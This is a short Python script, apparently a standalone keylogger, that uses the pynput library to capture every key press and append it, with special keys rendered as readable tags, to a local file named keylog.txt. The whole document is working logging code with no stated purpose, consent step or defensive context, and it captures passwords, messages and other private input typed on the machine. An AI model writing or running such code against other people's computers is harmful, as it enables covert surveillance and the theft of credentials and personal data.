from pynput import keyboard

# Mapping special keys for better readability
special_keys_mapping = {
    keyboard.Key.space: ' ',
    keyboard.Key.enter: '[ENTER]\n',
    keyboard.Key.tab: '[TAB]',
    keyboard.Key.backspace: '[BACKSPACE]',
    keyboard.Key.shift: '[SHIFT]',
    keyboard.Key.ctrl_l: '[CTRL]',
    keyboard.Key.ctrl_r: '[CTRL]',
    keyboard.Key.alt_l: '[ALT]',
    keyboard.Key.alt_gr: '[ALT]',
    keyboard.Key.caps_lock: '[CAPSLOCK]',
    keyboard.Key.delete: '[DELETE]',
    keyboard.Key.cmd: '[CMD]',
    keyboard.Key.esc: '[ESC]',
    keyboard.Key.up: '[UP]',
    keyboard.Key.down: '[DOWN]',
    keyboard.Key.left: '[LEFT]',
    keyboard.Key.right: '[RIGHT]',
    keyboard.Key.page_up: '[PAGE UP]',
    keyboard.Key.page_down: '[PAGE DOWN]',
    keyboard.Key.home: '[HOME]',
    keyboard.Key.end: '[END]',
    keyboard.Key.insert: '[INSERT]',
    keyboard.Key.menu: '[MENU]',
    keyboard.Key.media_play_pause: '[PLAY/PAUSE]',
    keyboard.Key.media_volume_mute: '[VOLUME MUTE]',
    keyboard.Key.media_volume_up: '[VOLUME UP]',
    keyboard.Key.media_volume_down: '[VOLUME DOWN]',
    keyboard.Key.media_next: '[NEXT TRACK]',
    keyboard.Key.media_previous: '[PREVIOUS TRACK]',
    keyboard.Key.f1: '[F1]',
    keyboard.Key.f2: '[F2]',
    keyboard.Key.f3: '[F3]',
    keyboard.Key.f4: '[F4]',
    keyboard.Key.f5: '[F5]',
    keyboard.Key.f6: '[F6]',
    keyboard.Key.f7: '[F7]',
    keyboard.Key.f8: '[F8]',
    keyboard.Key.f9: '[F9]',
    keyboard.Key.f10: '[F10]',
    keyboard.Key.f11: '[F11]',
    keyboard.Key.f12: '[F12]',
}

# Define a function to write a single logged key to a file
def write_to_file(key):
    with open("keylog.txt", "a") as f:
        if key in special_keys_mapping:
            f.write(special_keys_mapping[key])
        else:
            f.write(str(key).replace("'", ""))  # Remove single quotes around keys

# Define a function to handle key press events
def on_press(key):
    try:
        # Write to file immediately for each key press
        write_to_file(key)
    except AttributeError:
        # Handle special keys (e.g., shift, ctrl, etc.)
        write_to_file(key)

# Set up listener for key press events
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
